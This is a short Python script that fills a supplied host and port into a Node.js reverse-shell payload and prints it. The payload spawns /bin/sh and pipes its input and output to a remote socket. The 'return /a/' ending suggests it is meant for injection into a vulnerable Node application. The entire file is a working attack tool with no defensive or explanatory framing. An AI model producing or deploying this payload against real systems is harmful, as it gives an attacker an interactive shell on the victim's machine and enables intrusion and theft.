import sys
 
host = sys.argv[1]
port = sys.argv[2]
 
payload = '''(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({{PORT}}, "{{HOST}}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
'''

payload = payload.replace('{{PORT}}', str(port)).replace('{{HOST}}', str(host))
print('PAYLOAD:\n', payload)
